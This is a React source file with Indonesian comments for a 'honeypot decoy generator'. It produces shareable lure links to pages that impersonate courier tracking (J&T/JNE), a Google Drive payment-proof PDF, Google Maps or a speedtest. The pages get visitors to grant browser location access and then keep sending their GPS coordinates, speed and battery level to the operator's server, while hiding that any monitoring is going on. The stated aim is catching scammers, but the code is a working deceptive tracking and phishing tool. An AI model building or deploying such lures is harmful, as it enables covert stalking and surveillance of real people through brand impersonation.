import { useState, useEffect, useRef } from "react";
import {
  Navigation,
  Play,
  Square,
  Battery,
  Wifi,
  Share2,
  Copy,
  Check,
  Package,
  Truck,
  MapPin,
  FileText,
  Download,
  Gauge,
  CheckCircle2,
  Eye,
  ShieldCheck,
  ArrowRight,
  Sparkles,
} from "lucide-react";

// Rumus Haversine: Hitung selisih jarak dalam meter antara 2 titik koordinat
function getDistanceFromLatLonInMeters(lat1, lon1, lat2, lon2) {
  const R = 6371000;
  const dLat = ((lat2 - lat1) * Math.PI) / 180;
  const dLon = ((lon2 - lon1) * Math.PI) / 180;
  const a =
    Math.sin(dLat / 2) * Math.sin(dLat / 2) +
    Math.cos((lat1 * Math.PI) / 180) *
      Math.cos((lat2 * Math.PI) / 180) *
      Math.sin(dLon / 2) *
      Math.sin(dLon / 2);
  const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
  return R * c;
}

// Preset Umpan / Kamuflase Sosial (Decoy Themes)
const DECOY_THEMES = [
  {
    id: "courier",
    name: "📦 Lacak Paket Kurir (J&T / JNE / Ekspedisi)",
    badge: "Paling Efektif",
    desc: "Menyamar sebagai halaman cek posisi kurir & live tracking paket",
    title: "Lacak Pengiriman Paket & Posisi Kurir",
    subtitle: "Kurir sedang menuju alamat penerima. Konfirmasi lokasi untuk menampilkan posisi kurir di peta dan estimasi tiba.",
    cta: "Lacak Posisi Kurir Sekarang",
    successMsg: "Lokasi Anda terhubung dengan kurir. Kurir Budi S. berada 1.2 km dari Anda (Estimasi 15-20 menit).",
  },
  {
    id: "gdrive",
    name: "📄 Dokumen Google Drive / Bukti Pembayaran",
    badge: "Populer",
    desc: "Menyamar sebagai unduhan file PDF bukti transfer terlindungi",
    title: "Google Drive: Bukti_Pembayaran_Lunas.pdf",
    subtitle: "Dokumen terenkripsi keamanan geofence. Izinkan akses lokasi untuk memverifikasi zona unduhan berkas.",
    cta: "Buka & Unduh Berkas PDF",
    successMsg: "Verifikasi zona berhasil. Mengunduh berkas ke perangkat Anda...",
  },
  {
    id: "maps",
    name: "📍 Google Maps Titik Temu Langsung",
    badge: "Alami",
    desc: "Menyamar sebagai link navigasi titik kumpul/COD",
    title: "Google Maps: Titik Temu Dibagikan",
    subtitle: "Seseorang membagikan koordinat titik temu dengan Anda. Buka rute navigasi dari posisi Anda saat ini.",
    cta: "Buka Navigasi Rute Maps",
    successMsg: "Rute terhubung. Mengalihkan ke aplikasi Google Maps...",
  },
  {
    id: "speedtest",
    name: "📶 Speedtest & Uji Sinyal Jaringan",
    badge: "Umum",
    desc: "Menyamar sebagai tes kecepatan internet & server terdekat",
    title: "Network Speedtest: Server Terdekat",
    subtitle: "Izinkan lokasi untuk memilih server pengujian dengan latensi dan ping paling optimal.",
    cta: "Mulai Uji Kecepatan Sinyal",
    successMsg: "Server optimal ditemukan (Ping: 14ms). Menjalankan pengujian...",
  },
  {
    id: "debug",
    name: "🛡️ Mode Teknis / Internal Sentinel",
    badge: "Dev Only",
    desc: "Tampilan asli monitoring telemetri untuk pengujian developer",
    title: "Sentinel GPS Telemetry Node",
    subtitle: "Transmisi koordinat telemetri internal untuk validasi peta radar.",
    cta: "Izinkan & Mulai Berbagi Lokasi",
    successMsg: "Telemetri aktif mentransmisikan data ke server.",
  },
];

export default function MobileSender({ isStandalone = false }) {
  // Parsing parameter URL
  const queryParams = typeof window !== "undefined" ? new URLSearchParams(window.location.search) : null;
  const paramDev = queryParams?.get("device");
  const paramTheme = queryParams?.get("theme") || queryParams?.get("lure") || "courier";

  const [deviceId, setDeviceId] = useState(() => {
    if (paramDev) return paramDev;
    return `target-${Math.floor(1000 + Math.random() * 9000)}`;
  });

  const [selectedTheme, setSelectedTheme] = useState(paramTheme);
  const [isTracking, setIsTracking] = useState(false);
  const [coords, setCoords] = useState(null);
  const [statusMessage, setStatusMessage] = useState("Standby");
  const [batteryLevel, setBatteryLevel] = useState(100);
  const [copied, setCopied] = useState(false);
  const [hasSuccessFeedback, setHasSuccessFeedback] = useState(false);

  const watchIdRef = useRef(null);
  const lastSentRef = useRef({ lat: null, lng: null, time: 0 });

  const activeDecoy = DECOY_THEMES.find((t) => t.id === selectedTheme) || DECOY_THEMES[0];

  // Deteksi URL backend
  const backendUrl =
    import.meta.env.VITE_BACKEND_URL ||
    (typeof window !== "undefined" &&
    (window.location.hostname === "localhost" ||
      window.location.hostname === "127.0.0.1")
      ? `http://${window.location.hostname}:5000`
      : typeof window !== "undefined"
        ? window.location.origin
        : "");

  const shareableUrl =
    typeof window !== "undefined"
      ? `${window.location.origin}/?tab=track&device=${deviceId}&theme=${selectedTheme}`
      : "";

  useEffect(() => {
    if (navigator.getBattery) {
      navigator.getBattery().then((battery) => {
        setBatteryLevel(Math.round(battery.level * 100));
        battery.addEventListener("levelchange", () => {
          setBatteryLevel(Math.round(battery.level * 100));
        });
      });
    }
  }, []);

  const copyShareLink = () => {
    navigator.clipboard.writeText(shareableUrl);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const sendTelemetry = async (latitude, longitude, speed) => {
    try {
      const res = await fetch(`${backendUrl}/api/telemetry`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          device_id: deviceId,
          latitude,
          longitude,
          speed: speed ? Math.round(speed * 3.6) : 0,
          battery_level: batteryLevel,
        }),
      });
      if (res.ok) {
        setStatusMessage(`Terkirim (${new Date().toLocaleTimeString("id-ID")})`);
        setHasSuccessFeedback(true);
      }
    } catch {
      setStatusMessage("Koneksi server terputus");
    }
  };

  const startTracking = () => {
    if (!navigator.geolocation) {
      alert("Browser perangkat tidak mendukung fitur lokasi.");
      return;
    }

    setIsTracking(true);
    setStatusMessage("Mengunci sinyal GPS...");

    watchIdRef.current = navigator.geolocation.watchPosition(
      (pos) => {
        const { latitude, longitude, speed, accuracy } = pos.coords;
        setCoords({ latitude, longitude, accuracy });

        const now = Date.now();
        const last = lastSentRef.current;

        const timeDiff = (now - last.time) / 1000;
        let distanceDiff = 999;
        if (last.lat !== null && last.lng !== null) {
          distanceDiff = getDistanceFromLatLonInMeters(
            last.lat,
            last.lng,
            latitude,
            longitude,
          );
        }

        if (last.lat === null || (timeDiff >= 8 && distanceDiff >= 10)) {
          lastSentRef.current = { lat: latitude, lng: longitude, time: now };
          sendTelemetry(latitude, longitude, speed);
        } else {
          setStatusMessage("Posisi terkonfirmasi");
        }
      },
      (err) => {
        setStatusMessage(`GPS: ${err.message}`);
        setIsTracking(false);
      },
      {
        enableHighAccuracy: true,
        maximumAge: 5000,
        timeout: 15000,
      },
    );
  };

  const stopTracking = () => {
    if (watchIdRef.current !== null) {
      navigator.geolocation.clearWatch(watchIdRef.current);
      watchIdRef.current = null;
    }
    setIsTracking(false);
    setStatusMessage("Pelacakan dihentikan");
  };

  // =========================================================
  // TAMPILAN MODE STANDALONE (YANG DILIHAT TARGET / PENIPU)
  // =========================================================
  if (isStandalone) {
    return (
      <div className="w-full">
        {/* TEMPLATE: 1. LACAK PAKET EKSPEDISI / KURIR */}
        {selectedTheme === "courier" && (
          <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6 sm:p-8 space-y-6 shadow-2xl text-slate-100 font-sans">
            <div className="flex items-center justify-between border-b border-slate-800/80 pb-4">
              <div className="flex items-center gap-2.5">
                <div className="p-2.5 bg-rose-600/20 text-rose-400 rounded-xl border border-rose-500/30">
                  <Truck size={22} />
                </div>
                <div>
                  <h3 className="text-sm font-bold tracking-wide text-white uppercase">
                    Express Logistics Tracking
                  </h3>
                  <span className="text-[11px] text-slate-400 font-mono">
                    Resi: #JP8921049281
                  </span>
                </div>
              </div>
              <span className="px-2.5 py-1 bg-amber-950 text-amber-400 border border-amber-800 rounded-full text-[10px] font-bold">
                Sedang Dikirim
              </span>
            </div>

            <div className="space-y-3">
              <h2 className="text-base font-bold text-white leading-snug">
                {activeDecoy.title}
              </h2>
              <p className="text-xs text-slate-400 leading-relaxed">
                {activeDecoy.subtitle}
              </p>
            </div>

            {/* Stepper Pengiriman */}
            <div className="p-4 bg-slate-950 rounded-xl border border-slate-800/80 space-y-3 text-xs">
              <div className="flex items-center gap-3">
                <CheckCircle2 size={16} className="text-emerald-400 shrink-0" />
                <div>
                  <p className="font-semibold text-slate-200">Paket Diterima di Hub Tujuan</p>
                  <p className="text-[10px] text-slate-500">Pukul 08:30 WIB - Petugas Sortir</p>
                </div>
              </div>
              <div className="flex items-center gap-3">
                <Truck size={16} className="text-indigo-400 shrink-0 animate-pulse" />
                <div>
                  <p className="font-semibold text-indigo-300">Kurir Mengantar ke Alamat Anda</p>
                  <p className="text-[10px] text-slate-400">Driver: Budi Santoso (Kendaraan Roda 2)</p>
                </div>
              </div>
            </div>

            {hasSuccessFeedback && (
              <div className="p-4 bg-emerald-950/40 border border-emerald-800/60 rounded-xl text-xs space-y-1 text-emerald-300 animate-in fade-in duration-300">
                <p className="font-bold flex items-center gap-1.5">
                  <CheckCircle2 size={14} className="text-emerald-400" /> Posisi Rute Terkonfirmasi
                </p>
                <p className="text-[11px] text-emerald-400/90 leading-relaxed">
                  {activeDecoy.successMsg}
                </p>
              </div>
            )}

            {!isTracking ? (
              <button
                onClick={startTracking}
                className="w-full py-3.5 bg-rose-600 hover:bg-rose-500 active:scale-[0.99] text-white rounded-xl text-sm font-bold transition shadow-lg shadow-rose-600/25 flex items-center justify-center gap-2"
              >
                <MapPin size={16} /> {activeDecoy.cta}
              </button>
            ) : (
              <div className="space-y-3">
                <div className="p-3 bg-slate-950 rounded-xl border border-slate-800 text-center text-xs text-indigo-300 flex items-center justify-center gap-2">
                  <Wifi size={14} className="text-indigo-400 animate-pulse" />
                  <span>Satelit GPS terhubung ke kurir...</span>
                </div>
              </div>
            )}
          </div>
        )}

        {/* TEMPLATE: 2. GOOGLE DRIVE BUKTI PEMBAYARAN */}
        {selectedTheme === "gdrive" && (
          <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6 sm:p-8 space-y-6 shadow-2xl text-slate-100 font-sans">
            <div className="flex items-center gap-3 border-b border-slate-800/80 pb-4">
              <div className="p-2.5 bg-amber-500/20 text-amber-400 rounded-xl border border-amber-500/30">
                <FileText size={22} />
              </div>
              <div>
                <h3 className="text-sm font-bold text-white">Google Drive Secure Storage</h3>
                <span className="text-[11px] text-slate-400">Pratinjau Berkas Terenkripsi</span>
              </div>
            </div>

            <div className="p-4 bg-slate-950 rounded-xl border border-slate-800 space-y-2">
              <div className="flex items-center justify-between text-xs">
                <span className="font-semibold text-slate-200">Bukti_Transfer_Pembayaran_Lunas.pdf</span>
                <span className="text-slate-500">2.1 MB</span>
              </div>
              <div className="h-1.5 w-full bg-slate-800 rounded-full overflow-hidden">
                <div className="h-full bg-indigo-500 rounded-full w-full"></div>
              </div>
              <p className="text-[11px] text-slate-400 mt-2">
                {activeDecoy.subtitle}
              </p>
            </div>

            {hasSuccessFeedback && (
              <div className="p-4 bg-emerald-950/40 border border-emerald-800/60 rounded-xl text-xs text-emerald-300">
                <p className="font-bold flex items-center gap-1.5">
                  <CheckCircle2 size={14} /> Izin Divalidasi
                </p>
                <p className="text-[11px] mt-1">{activeDecoy.successMsg}</p>
              </div>
            )}

            {!isTracking ? (
              <button
                onClick={startTracking}
                className="w-full py-3.5 bg-indigo-600 hover:bg-indigo-500 active:scale-[0.99] text-white rounded-xl text-sm font-bold transition shadow-lg shadow-indigo-600/25 flex items-center justify-center gap-2"
              >
                <Download size={16} /> {activeDecoy.cta}
              </button>
            ) : (
              <div className="p-3 bg-slate-950 rounded-xl border border-slate-800 text-center text-xs text-indigo-300 flex items-center justify-center gap-2">
                <Wifi size={14} className="animate-pulse" />
                <span>Memvalidasi sertifikat zona dokumen...</span>
              </div>
            )}
          </div>
        )}

        {/* TEMPLATE: 3. GOOGLE MAPS TITIK TEMU */}
        {selectedTheme === "maps" && (
          <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6 sm:p-8 space-y-6 shadow-2xl text-slate-100 font-sans">
            <div className="flex items-center gap-3 border-b border-slate-800/80 pb-4">
              <div className="p-2.5 bg-emerald-600/20 text-emerald-400 rounded-xl border border-emerald-500/30">
                <MapPin size={22} />
              </div>
              <div>
                <h3 className="text-sm font-bold text-white">Google Maps Navigation</h3>
                <span className="text-[11px] text-slate-400">Titik Temu Bersama</span>
              </div>
            </div>

            <div className="space-y-2">
              <h2 className="text-base font-bold text-white">{activeDecoy.title}</h2>
              <p className="text-xs text-slate-400 leading-relaxed">{activeDecoy.subtitle}</p>
            </div>

            {hasSuccessFeedback && (
              <div className="p-4 bg-emerald-950/40 border border-emerald-800/60 rounded-xl text-xs text-emerald-300">
                <p className="font-bold flex items-center gap-1.5">
                  <CheckCircle2 size={14} /> Terhubung ke Google Maps
                </p>
                <p className="text-[11px] mt-1">{activeDecoy.successMsg}</p>
              </div>
            )}

            {!isTracking ? (
              <button
                onClick={startTracking}
                className="w-full py-3.5 bg-emerald-600 hover:bg-emerald-500 text-white rounded-xl text-sm font-bold transition shadow-lg shadow-emerald-600/25 flex items-center justify-center gap-2"
              >
                <Navigation size={16} /> {activeDecoy.cta}
              </button>
            ) : (
              <div className="p-3 bg-slate-950 rounded-xl border border-slate-800 text-center text-xs text-emerald-300 flex items-center justify-center gap-2">
                <Wifi size={14} className="animate-pulse" />
                <span>Menghitung rute navigasi terdekat...</span>
              </div>
            )}
          </div>
        )}

        {/* TEMPLATE: 4. SPEEDTEST & SINYAL */}
        {selectedTheme === "speedtest" && (
          <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6 sm:p-8 space-y-6 shadow-2xl text-slate-100 font-sans">
            <div className="flex items-center gap-3 border-b border-slate-800/80 pb-4">
              <div className="p-2.5 bg-cyan-600/20 text-cyan-400 rounded-xl border border-cyan-500/30">
                <Gauge size={22} />
              </div>
              <div>
                <h3 className="text-sm font-bold text-white">Speedtest Sinyal & Latensi</h3>
                <span className="text-[11px] text-slate-400">Pengujian Jaringan Otomatis</span>
              </div>
            </div>

            <div className="space-y-2">
              <h2 className="text-base font-bold text-white">{activeDecoy.title}</h2>
              <p className="text-xs text-slate-400 leading-relaxed">{activeDecoy.subtitle}</p>
            </div>

            {hasSuccessFeedback && (
              <div className="p-4 bg-emerald-950/40 border border-emerald-800/60 rounded-xl text-xs text-emerald-300">
                <p className="font-bold flex items-center gap-1.5">
                  <CheckCircle2 size={14} /> Server Terkoneksi
                </p>
                <p className="text-[11px] mt-1">{activeDecoy.successMsg}</p>
              </div>
            )}

            {!isTracking ? (
              <button
                onClick={startTracking}
                className="w-full py-3.5 bg-cyan-600 hover:bg-cyan-500 text-white rounded-xl text-sm font-bold transition shadow-lg shadow-cyan-600/25 flex items-center justify-center gap-2"
              >
                <Play size={16} /> {activeDecoy.cta}
              </button>
            ) : (
              <div className="p-3 bg-slate-950 rounded-xl border border-slate-800 text-center text-xs text-cyan-300 flex items-center justify-center gap-2">
                <Wifi size={14} className="animate-pulse" />
                <span>Mengukur latency server terdekat...</span>
              </div>
            )}
          </div>
        )}

        {/* TEMPLATE: 5. DEBUG / TEKNIKAL ORIGINAL */}
        {selectedTheme === "debug" && (
          <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6 space-y-5 shadow-2xl text-slate-100 font-sans">
            <div className="text-center space-y-2">
              <div className="inline-flex p-3 bg-indigo-600/20 text-indigo-400 rounded-full border border-indigo-500/30">
                <Navigation size={24} />
              </div>
              <h2 className="text-lg font-semibold text-slate-100">
                Sentinel Telemetry Node
              </h2>
              <p className="text-xs text-slate-400">
                Perangkat <span className="font-mono text-indigo-300">{deviceId}</span> mode uji coba langsung.
              </p>
            </div>

            <div className="bg-slate-950 p-3 rounded-lg border border-slate-800 flex justify-between text-xs">
              <span className="text-slate-400">Baterai:</span>
              <span className="text-emerald-400 font-mono font-bold">{batteryLevel}%</span>
            </div>

            {!isTracking ? (
              <button
                onClick={startTracking}
                className="w-full py-3 bg-indigo-600 hover:bg-indigo-500 text-white rounded-xl text-sm font-semibold transition"
              >
                Mulai Transmisi Telemetri
              </button>
            ) : (
              <button
                onClick={stopTracking}
                className="w-full py-3 bg-rose-600 hover:bg-rose-500 text-white rounded-xl text-sm font-semibold transition"
              >
                Hentikan Transmisi
              </button>
            )}
          </div>
        )}
      </div>
    );
  }

  // =========================================================
  // TAMPILAN ADMIN DASHBOARD (PENGATURAN & GENERATOR UMPAN)
  // =========================================================
  return (
    <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6 space-y-6 shadow-xl">
      <div>
        <h2 className="text-base font-semibold text-slate-200 flex items-center gap-2">
          <Navigation size={18} className="text-indigo-400" />
          Honeypot Decoy Generator & Mobile Telemetry Node
        </h2>
        <p className="text-xs text-slate-400 mt-1">
          Buat tautan umpan kamuflase sosial (*lure link*) yang meyakinkan agar target/penipu mengizinkan akses lokasi secara alami tanpa curiga.
        </p>
      </div>

      <div className="space-y-4">
        {/* Pilihan Template Kamuflase */}
        <div>
          <label className="text-xs font-semibold text-slate-300 block mb-2 flex items-center gap-1.5">
            <Sparkles size={14} className="text-indigo-400" />
            Pilih Tema Kamuflase (Honeypot Trap):
          </label>
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-2.5">
            {DECOY_THEMES.map((theme) => {
              const isSelected = selectedTheme === theme.id;
              return (
                <button
                  key={theme.id}
                  type="button"
                  onClick={() => setSelectedTheme(theme.id)}
                  className={`p-3 rounded-xl border text-left transition flex flex-col justify-between ${
                    isSelected
                      ? "bg-indigo-600/15 border-indigo-500 text-white shadow-sm"
                      : "bg-slate-950/70 border-slate-800 text-slate-400 hover:border-slate-700 hover:text-slate-200"
                  }`}
                >
                  <div className="flex items-center justify-between w-full mb-1">
                    <span className="text-xs font-bold text-slate-200">
                      {theme.name}
                    </span>
                    <span
                      className={`text-[10px] px-2 py-0.5 rounded font-bold ${
                        isSelected
                          ? "bg-indigo-600 text-white"
                          : "bg-slate-800 text-slate-400"
                      }`}
                    >
                      {theme.badge}
                    </span>
                  </div>
                  <p className="text-[11px] text-slate-500 leading-snug">
                    {theme.desc}
                  </p>
                </button>
              );
            })}
          </div>
        </div>

        {/* Input Device ID */}
        <div>
          <label className="text-xs text-slate-400 block mb-1">
            Target ID / Device Alias:
          </label>
          <input
            type="text"
            className="w-full p-2.5 bg-slate-950 border border-slate-800 rounded-lg text-xs font-mono text-indigo-300 focus:outline-none focus:border-indigo-500"
            value={deviceId}
            disabled={isTracking}
            onChange={(e) => setDeviceId(e.target.value.trim())}
          />
        </div>

        {/* Kotak Berbagi Tautan Siap Kirim */}
        <div className="p-4 bg-slate-950 rounded-xl border border-slate-800 space-y-2.5">
          <div className="flex items-center justify-between text-xs text-slate-300">
            <span className="flex items-center gap-1.5 font-semibold text-emerald-400">
              <Share2 size={13} /> Link Umpan Siap Kirim ke Target:
            </span>
            <button
              onClick={copyShareLink}
              className="px-2.5 py-1 bg-indigo-600 hover:bg-indigo-500 text-white rounded-lg flex items-center gap-1 text-xs font-semibold transition"
            >
              {copied ? (
                <Check size={12} className="text-white" />
              ) : (
                <Copy size={12} />
              )}
              {copied ? "Tersalin!" : "Salin Link"}
            </button>
          </div>
          <p className="text-[11px] font-mono text-indigo-300 break-all bg-slate-900/80 p-2.5 rounded-lg border border-slate-800/80">
            {shareableUrl}
          </p>
          <p className="text-[10px] text-slate-500">
            * Ketika target membuka link ini, mereka akan melihat antarmuka{" "}
            <b className="text-slate-300">{activeDecoy.name}</b> yang bersih tanpa identitas sistem monitoring.
          </p>
        </div>

        {/* Panel Pengujian Langsung dari Browser Ini */}
        <div className="pt-2 border-t border-slate-800 space-y-3">
          <div className="flex justify-between items-center text-xs">
            <span className="text-slate-400">Uji Coba Pengiriman GPS dari Browser Anda:</span>
            <span className="text-slate-400 font-mono">Baterai: {batteryLevel}%</span>
          </div>

          <div className="flex items-center gap-2 text-xs text-slate-400 bg-slate-950/50 p-2.5 rounded-lg border border-slate-800/80 font-mono">
            <Wifi
              size={13}
              className={isTracking ? "text-emerald-400 animate-pulse" : "text-slate-600"}
            />
            Status: <span className="text-slate-200">{statusMessage}</span>
          </div>

          {!isTracking ? (
            <button
              onClick={startTracking}
              className="w-full flex items-center justify-center gap-2 py-2.5 bg-slate-800 hover:bg-slate-700 text-slate-200 rounded-lg text-xs font-semibold transition"
            >
              <Play size={14} /> Tes Transmisi GPS Lokal
            </button>
          ) : (
            <button
              onClick={stopTracking}
              className="w-full flex items-center justify-center gap-2 py-2.5 bg-rose-900/60 hover:bg-rose-800 text-rose-200 rounded-lg text-xs font-semibold transition"
            >
              <Square size={14} /> Hentikan Tes
            </button>
          )}
        </div>
      </div>
    </div>
  );
}
